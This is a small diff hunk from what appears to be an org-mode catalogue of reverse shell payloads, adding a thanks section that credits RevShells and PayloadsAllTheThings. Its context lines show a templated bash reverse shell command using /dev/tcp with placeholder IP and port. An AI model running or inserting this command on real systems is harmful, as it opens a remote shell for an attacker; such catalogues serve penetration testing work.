@@ -60,3 +60,5 @@ OS:		["linux", "mac"]
 Subcomponents:	["IP", "PORT"]
 Command:	bash -i >& /dev/tcp/{SUBIP}/{SUBPORT} 0>&1
 #+END_SRC
+* Thanks
+Thanks to [[https://www.revshells.com/][RevShells]] and [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell=][PayloadsAllTheThings]]
